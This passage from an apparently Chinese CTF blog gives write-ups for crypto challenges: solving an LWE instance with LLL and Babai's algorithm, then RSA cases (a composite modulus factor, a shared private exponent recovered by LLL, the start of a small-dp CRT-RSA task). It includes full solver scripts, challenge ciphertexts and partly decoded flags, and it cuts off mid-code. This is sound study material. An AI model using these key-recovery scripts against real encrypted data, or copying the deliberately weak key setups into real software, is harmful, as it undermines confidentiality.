</span>271<span class="number"> 484 </span>177]</span><br><span class="line">[448 <span class="number"> 78 </span>479<span class="number"> 324 </span>170  <span class="number"> 7 </span>230<span class="number"> 173 </span>214 <span class="number"> 65 </span><span class="number"> 91 </span>497 <span class="number"> 68 </span>391 <span class="number"> 44 </span>205<span class="number"> 364 </span>471<span class="number"> 460 </span>312 122]</span><br><span class="line">[452<span class="number"> 360 </span>448<span class="number"> 169 </span>240<span class="number"> 496 </span>302  <span class="number"> 3 </span>354<span class="number"> 266 </span><span class="number"> 46 </span><span class="number"> 22 </span>151<span class="number"> 498 </span>461<span class="number"> 314 </span>169 <span class="number"> 88 </span><span class="number"> 30 </span>487 258]</span><br></pre></td></tr></table></figure><p><strong>向量F</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">49</span>, <span class="number">52</span>, <span class="number">101</span>, <span class="number">54</span>, <span class="number">102</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">54</span>, <span class="number">45</span>, <span class="number">57</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">57</span>, <span class="number">45</span>, <span class="number">52</span>, <span class="number">54</span>]</span><br></pre></td></tr></table></figure><p><strong>C1 = K✖️F</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">(1702,</span> <span class="number">795</span><span class="string">,</span> <span class="number">740</span><span class="string">,</span> <span class="number">373</span><span class="string">,</span> <span class="number">535</span><span class="string">,</span> <span class="number">1308</span><span class="string">,</span> <span class="number">1050</span><span class="string">,</span> <span class="number">502</span><span class="string">,</span> <span class="number">40</span><span class="string">,</span> <span class="number">672</span><span class="string">,</span> <span class="number">1354</span><span class="string">,</span> <span class="number">1843</span><span class="string">,</span> <span class="number">515</span><span class="string">,</span> <span class="number">231</span><span class="string">,</span> <span class="number">774</span><span class="string">,</span> <span class="number">65</span><span class="string">,</span> <span class="number">978</span><span class="string">,</span> <span class="number">1340</span><span class="string">,</span> <span class="number">455</span><span class="string">,</span> <span class="number">2137</span><span class="string">,</span> <span class="number">733</span><span class="string">)</span></span><br></pre></td></tr></table></figure><p>经过验证，矩阵与向量相乘为每行对应项相乘再求和，以下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">m</span> =<span class="meta"> [102, 108, 97, 103, 123, 49, 52, 101, 54, 102, 50, 51, 54, 45, 57, 101, 98, 57, 45, 52, 54]</span></span><br><span class="line"><span class="attribute">k</span> = &#x27;<span class="number">185</span>  <span class="number">96</span> <span class="number">351</span> <span class="number">118</span> <span class="number">421</span> <span class="number">449</span> <span class="number">350</span> <span class="number">349</span> <span class="number">388</span>  <span class="number">95</span> <span class="number">341</span> <span class="number">327</span>  <span class="number">29</span> <span class="number">156</span> <span class="number">399</span> <span class="number">283</span> <span class="number">292</span> <span class="number">461</span> <span class="number">445</span> <span class="number">120</span> <span class="number">126</span>&#x27;.split(&#x27; &#x27;)</span><br><span class="line"><span class="attribute">k</span> =<span class="meta"> [int(i) for i in k if i]</span></span><br><span class="line"><span class="attribute">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="attribute">for</span> i in range(len(m)):</span><br><span class="line">    <span class="attribute">sum</span> += (m[i] * k[i]) % <span class="number">2141</span></span><br><span class="line"><span class="attribute">print</span>(sum % <span class="number">2141</span>)</span><br><span class="line"><span class="comment"># 1702</span></span><br></pre></td></tr></table></figure><p>故不用复杂的求解多个同余方程，可以直接让$K^{-1}*C1$，即可得到：F</p><ul><li>注意，这里必须左乘$K^{-1}$,即：$C1 = K<em>F; K^{-1}</em>C1 = F$<ul><li>也就是说F是列向量？</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.modules.free_module_integer <span class="keyword">import</span> IntegerLattice</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> starmap</span><br><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> mul</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = <span class="built_in">eval</span>(f.readline())</span><br><span class="line">    c1 = <span class="built_in">eval</span>(f.readline())</span><br><span class="line">    c2 = <span class="built_in">eval</span>(f.readline())</span><br><span class="line"></span><br><span class="line">prime = <span class="number">2141</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  矩阵求解的思维</span></span><br><span class="line">K = matrix(Zmod(prime), key[:<span class="number">21</span>])  <span class="comment"># 一来，21行足够；二来方阵才可求逆</span></span><br><span class="line">C1 = vector(Zmod(prime), c1[:<span class="number">21</span>])</span><br><span class="line">m1 = K.inverse() * C1</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m1:</span><br><span class="line">    flag += <span class="built_in">chr</span>(i)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><strong>整数域上的环，奇妙！</strong></p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">noise = [random.randint(<span class="number">0</span>,<span class="number">6</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br></pre></td></tr></table></figure><ol><li><p>C2 = multi(Key, flag2)</p></li><li><p>C2 = add(noise, C2) </p></li></ol><p>噪声打断了思绪，得重新整理整理。</p><p>赛时也了解到了LWE，但因为不知原理，不懂使用，故无所突破。</p><p>按照当时的想法，认为此法能消掉noise就很🐮了，但赛后发现可以直接给到flag2🐮🐮🐮</p><p>水平、时间有限，LWE系统的原理学习暂先搁置，先试着读读看使用方法与代码</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220509205640566.png" alt="LWE"></p><p>简单翻译翻译，在此题中，则是给定Key矩阵，先令矩阵Key*向量flag2后再与noise相加，故：</p><ul><li>A = Key</li><li>s = flag2</li><li>e = noise</li><li>b = C2</li></ul><p>而LWE问题就是给<strong>A</strong>、b, 求s</p><p>所以一开始所惊叹的<strong>‘能直接求出flag2’</strong>，在此印证</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#脚本2-大规模</span></span><br><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="keyword">from</span> sage.modules.free_module_integer <span class="keyword">import</span> IntegerLattice</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> starmap</span><br><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> mul</span><br><span class="line"></span><br><span class="line"><span class="comment"># Babai&#x27;s Nearest Plane algorithm</span></span><br><span class="line"><span class="comment"># from: http://mslc.ctf.su/wp/plaidctf-2016-sexec-crypto-300/</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Babai_closest_vector</span>(<span class="params">M, G, target</span>):</span></span><br><span class="line">    small = target</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(M.nrows())):</span><br><span class="line">            c = ((small * G[i]) / (G[i] * G[i])).<span class="built_in">round</span>()</span><br><span class="line">            small -= M[i] * c</span><br><span class="line">    <span class="keyword">return</span> target - small</span><br><span class="line"></span><br><span class="line"><span class="comment"># A一般为key</span></span><br><span class="line"><span class="comment"># b为密文</span></span><br><span class="line"><span class="comment"># e为噪声</span></span><br><span class="line"><span class="comment"># s为flag（下面的ingredients</span></span><br><span class="line">  </span><br><span class="line">m =   <span class="comment"># A行数</span></span><br><span class="line">n =   <span class="comment"># A列数</span></span><br><span class="line">q =   <span class="comment"># 模数</span></span><br><span class="line"></span><br><span class="line">A_values = </span><br><span class="line">b_values = </span><br><span class="line"></span><br><span class="line">A = matrix(ZZ, m + n, m)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    A[i, i] = q</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        A[m + y, x] = A_values[x][y]</span><br><span class="line">lattice = IntegerLattice(A, lll_reduce=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;LLL done&quot;</span>)</span><br><span class="line">gram = lattice.reduced_basis.gram_schmidt()[<span class="number">0</span>]</span><br><span class="line">target = vector(ZZ, b_values)</span><br><span class="line">res = Babai_closest_vector(lattice.reduced_basis, gram, target)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Closest Vector: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(res))</span><br><span class="line"></span><br><span class="line">R = IntegerModRing(q)</span><br><span class="line">M = Matrix(R, A_values)</span><br><span class="line">ingredients = M.solve_right(res)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Ingredients: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(ingredients))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> row, b <span class="keyword">in</span> <span class="built_in">zip</span>(A_values, b_values):</span><br><span class="line">    effect = <span class="built_in">sum</span>(starmap(mul, <span class="built_in">zip</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, ingredients), row))) % q</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">abs</span>(b - effect) &lt; <span class="number">2</span> ** <span class="number">37</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ok&quot;</span>)</span><br></pre></td></tr></table></figure><p>也发现，我们不需要知道flag2的长度</p><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li>矩阵、向量解题思路</li><li>LWE消除噪音</li><li>加深对sage的了解</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA题型总结</title>
      <link href="/2022/05/06/RSA%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/"/>
      <url>/2022/05/06/RSA%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Crypto-easy-crypto-｜-N中有大合数"><a href="#Crypto-easy-crypto-｜-N中有大合数" class="headerlink" title="Crypto_easy_crypto    ｜    N中有大合数"></a>Crypto_easy_crypto    ｜    N中有大合数</h2><ul><li><a href="https://blog.cryptohack.org/cryptoctf2020">https://blog.cryptohack.org/cryptoctf2020</a></li><li><a href="https://www.bilibili.com/video/BV1bb4y1W7vM?spm_id_from=333.999.0.0">N分解出合数</a></li></ul><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span>(<span class="params">nbit</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p, q, r = [getPrime(nbit) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">        <span class="keyword">if</span> isPrime(p + q + r):</span><br><span class="line">            pubkey = (p * q * r, p + q + r)</span><br><span class="line">            privkey = (p, q, r)</span><br><span class="line">            <span class="keyword">return</span> pubkey, privkey</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">msg, pubkey</span>):</span></span><br><span class="line">    enc = <span class="built_in">pow</span>(bytes_to_long(msg.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="number">0x10001</span>, pubkey[<span class="number">0</span>] * pubkey[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> enc</span><br><span class="line"></span><br><span class="line">nbit = <span class="number">512</span></span><br><span class="line">pubkey, _ = keygen(nbit)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;pubkey =&#x27;</span>, pubkey)</span><br><span class="line"></span><br><span class="line">enc = encrypt(flag, pubkey)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;enc =&#x27;</span>, enc)</span><br><span class="line"><span class="comment">#pubkey = (763929224901239050077647342425144363318006219360210465113458622937882119766705458273788947718911994090187932947694326848868575500906975653763043489419853300731695950407389203582333794360159494405111004208058198680365172060235321945875374635278292661761319773173838900295933943437761251440819434675631450032782188481758975272071015244168751016874668742536151359822585793537758876078350987062972237271763834743266722655055439868971805843593929839097963319788083763,</span></span><br><span class="line"><span class="comment"># 27750416681837900468631425875797804482827864226099175414717825894823303299159277202974070903630276868248755642608884903122768656427165401563920443482151217)</span></span><br><span class="line"><span class="comment">#enc = 7579294603035135817234501131256282324240132424272000903035801073847222917306092792610406876451698121956232047031639448767323475088170357863653435096746640609325525035329328626562143049656124241263576649974820533800161432666946327226418036826146160288273175521864687122720836795596635067761146519940441817765732160382018434465776749372209181212817247187474685246156193381822044772746654690126746715728166527274933634750443478682812664022009444348448955720226579468781927776133336045525149203384137859868153077820708167146052429014790660921586958660759949399826568136755816563468739111123761288318276379025018708883521</span></span><br></pre></td></tr></table></figure><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">b=<span class="number">27750416681837900468631425875797804482827864226099175414717825894823303299159277202974070903630276868248755642608884903122768656427165401563920443482151217</span></span><br><span class="line">c=<span class="number">7579294603035135817234501131256282324240132424272000903035801073847222917306092792610406876451698121956232047031639448767323475088170357863653435096746640609325525035329328626562143049656124241263576649974820533800161432666946327226418036826146160288273175521864687122720836795596635067761146519940441817765732160382018434465776749372209181212817247187474685246156193381822044772746654690126746715728166527274933634750443478682812664022009444348448955720226579468781927776133336045525149203384137859868153077820708167146052429014790660921586958660759949399826568136755816563468739111123761288318276379025018708883521</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">phi = b-<span class="number">1</span></span><br><span class="line">d = libnum.invmod(e, phi)</span><br><span class="line">flag = <span class="built_in">pow</span>(c,d,b)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(flag).decode())</span><br></pre></td></tr></table></figure><p>直接把另一堆(<code>p*q*r</code>)忽略了，当成单素数(<code>p+q+r</code>)加密的RSA解🤔</p><p>回想起来，原来看过此类问题的解法视频</p><p>可惜，被p、q、r唬住了。</p><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><ul><li><strong>N分解过程中，比m大的合数可以直接忽略</strong><ul><li>剩下的也不一定是素数，记得check</li><li>剩下的数当作新的模，<strong>得大于m</strong>（不然就得爆破k）</li></ul></li></ul><p>为什么？不知道</p><h2 id="CRT-共d"><a href="#CRT-共d" class="headerlink" title="CRT    |    共d"></a>CRT    |    共d</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> shuffle</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;flag is here&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shuffle_flag</span>(<span class="params">s</span>):</span></span><br><span class="line">    str_list = <span class="built_in">list</span>(s)</span><br><span class="line">    shuffle(str_list)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(str_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nl = []</span><br><span class="line">el = []</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count != <span class="number">5</span>:</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = gmpy2.next_prime(bytes_to_long(flag))</span><br><span class="line">    e = gmpy2.invert(d, phi)</span><br><span class="line">    nl.append(n)</span><br><span class="line">    el.append(<span class="built_in">int</span>(e))</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(nl)</span><br><span class="line"><span class="built_in">print</span>(el)</span><br><span class="line"></span><br><span class="line">cl = []</span><br><span class="line">flag = shuffle_flag(flag.decode()).encode()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nl)):</span><br><span class="line">    cl.append(<span class="built_in">pow</span>(bytes_to_long(flag), el[i], nl[i]))</span><br><span class="line"><span class="built_in">print</span>(cl)</span><br></pre></td></tr></table></figure><h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###Sage###</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">nl=[<span class="number">92568419674731290088321621356482160506897805615722568594108449347104924357404183476911642777855820991398881156764068184840768873749718093598712551142529474514837161712525386555067489900887826033760157015587905876891826276883359425048106383489316555600680137377034136599761900203863336332834524981581608546277</span>, <span class="number">156396473818563541024482014372866929605198443382524196879362284224099117401220679011156723462510565131555949471059964179767945960498473012008220045105490122503438703770112687917922899337041421537937431868908340506324082719417747902320117904166584374628828367801012533926776313544525573302674702867896838756349</span>, <span class="number">158394833243620345170313957479796081390446308753163267294427471181012679879060921676287361174926310080500003540773261012005682050743188110335872216992843352902160171999286576526304619756655278142788064189969927027027650043645613441449926633380809295720977302961310978360575684689811662689798196832145977450067</span>, <span class="number">160088237013152996062303719345275590040820298863729670660621544625451638541931139026114480452748397901155923890465415946150076272684251867169893163248736673419035618274961179288085209456220719404244194802327491684233804878013160262798831738441790443743813368173495029170393018727204042599457829167334217403039</span>, <span class="number">176125361422384852665447804150030174008849487020728296169340093618559367127086381778331613043595010796295772394708222184703701230685609172767761426620379001062695169120599393984950488304290958534830276649464003949555105491117656796777657620812669612752464591728873199832200616338112460100967288829163217253937</span>]</span><br><span class="line">el=[<span class="number">69312028009355287369151190914681978515224902099126626288106202481561083869512381976466800912049172557479956400189281179789850182367192324370292880508005951892909864237831856642160554901550928757105750738313195248541515727624216048436593804176317465366380022764459799506858495981817822670957526705611211712923</span>, <span class="number">75652848678989239962391202584125835503829570694373189157636155436633908234362973839251550542975725789188895010096917574118924190081886365041870173203566890015476761857546914959928731140619341634983144909962106759048918025248827973161384045263311189477657141886093632791593341193393085433749877270828641736687</span>, <span class="number">33787880341418355427411601538315129862488529656310145182009801227014512555036822623215545927750632031483856865027938518144081751233475248361490189179988637342429805607352670543555743822390555949569061340741015073482051059972283793490798701339277926430357560613555427570475360496737455291914090967005368044847</span>, <span class="number">45894271603047945281790624112313938740541711331584775481261776728213544262108835859642003140814571796838418889270625806159755478669858113687476417240730385707171289922064965084283027730393146219788228689778873266618663473231744646293406030907691363263939114550226424730102211751706087680590823466426973879111</span>, <span class="number">39462780066564051085365889083337472288277223628014907704844994419242541623368920096395581667207909872944692627394665038729398405841875334128211337544205143876652949004817962123951132753801707134333132359039376283331685997619531570270269964807335633423631078057345827010794671894948828680193958561375351954627</span>]</span><br><span class="line">cl=[<span class="number">706565317398633346290694952311166623770389747503953970254889622211015097472765489676349936599997109100148837713409666075736711752497174928509516666210124850782396573268200919345005742905131769799719677758163730270857245509037860252700476102090438501579886321486095767737006847692632649652528793934802014895</span>, <span class="number">39976293505792731417500342473259466413746324373570160856607039564687056797068114044891309890160001547746290678089875953230720229396293686037539133378586045964793387433679304899158546834837314101138069400994334720071006048815998660691472991971598192116289517127819703723844842002711298154106615035755646791235</span>, <span class="number">82622936948791971063481195310587447614375265630407688161651173440160941964839173273115526802240672776681580169092371677673709037579318090622040018030730165371997331146171751228791524747622285256591779419274845659567001522182995468819720594650389854677582186770321424062935881407083956991646633760500152137305</span>, <span class="number">47924672523033740219454774309397006543851002473271747603676349322670782245519637286314088457132590816165876451615235937683074852920250584155682791595116359054889940842281324709426616771765312825842634237678243213350551342690870568516232078792788925700389762945955053433276153136302757700081859531596237286407</span>, <span class="number">157462720644970256050843434459828247139256140406409429896418317109064365936294939244159292550184482469972819258184119865598346921909220060266145241164734603316978286567811044606538176157224828857158099074286931716459626013079677895357212211176535500327064375073662684801175545519382470886239209020257096407424</span>]</span><br><span class="line"></span><br><span class="line">M=iroot(<span class="built_in">int</span>(nl[<span class="number">4</span>]),<span class="built_in">int</span>(<span class="number">2</span>))[<span class="number">0</span>]</span><br><span class="line">a=[<span class="number">0</span>]*<span class="number">6</span></span><br><span class="line">a[<span class="number">0</span>]=[M,el[<span class="number">0</span>],el[<span class="number">1</span>],el[<span class="number">2</span>],el[<span class="number">3</span>],el[<span class="number">4</span>]]</span><br><span class="line">a[<span class="number">1</span>]=[<span class="number">0</span>,-nl[<span class="number">0</span>],<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">2</span>]=[<span class="number">0</span>,<span class="number">0</span>,-nl[<span class="number">1</span>],<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">3</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-nl[<span class="number">2</span>],<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">4</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-nl[<span class="number">3</span>],<span class="number">0</span>]</span><br><span class="line">a[<span class="number">5</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-nl[<span class="number">4</span>]]</span><br><span class="line"></span><br><span class="line">Mat = matrix(ZZ,a)</span><br><span class="line">Mat_LLL=Mat.LLL()</span><br><span class="line">d = <span class="built_in">abs</span>(Mat_LLL[<span class="number">0</span>][<span class="number">0</span>])// M  <span class="comment"># 这里得是整除 ‘//’ ！！！</span></span><br><span class="line">d= <span class="built_in">int</span>(d)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span>(gmpy2.is_prime(d)):</span><br><span class="line">    d -= <span class="number">1</span></span><br><span class="line">flag = <span class="built_in">int</span>(d)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(flag).decode())</span><br></pre></td></tr></table></figure><p>或许非预期吧，直接把d用LLL算法求出来了。</p><h3 id="结论-1"><a href="#结论-1" class="headerlink" title="结论"></a>结论</h3><ul><li>共d用<strong>LLL算法</strong>攻击（<strong>记得<code>d = abs(Mat_LLL[0][0])// M</code>整除!</strong></li></ul><h2 id="crtrsa-｜-dp小，e-很大"><a href="#crtrsa-｜-dp小，e-很大" class="headerlink" title="crtrsa    ｜    dp小，e 很大"></a>crtrsa    ｜    dp小，e 很大</h2><ul><li><a href="https://blog.csdn.net/qq_52193383/article/details/120642406?spm=1001.2014.3001.5502">https://blog.csdn.net/qq_52193383/article/details/120642406?spm=1001.2014.3001.5502</a></li></ul><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from secret import flagn,p,q</span><br><span class="line"><span class="meta">#p and q are two primes generated by getPrime</span></span><br><span class="line">import random</span><br><span class="line">def key_gen():</span><br><span class="line">    while True:</span><br><span class="line">dp = random.randint(<span class="number">1</span>,<span class="number">1</span>&lt;&lt;<span class="number">20</span>)</span><br><span class="line">dq = random.randint(<span class="number">1</span>,q-<span class="number">1</span>)</span><br><span class="line">if gcd(dp, p - <span class="number">1</span>) == <span class="number">1</span> and gcd(dq, q - <span class="number">1</span>) == <span 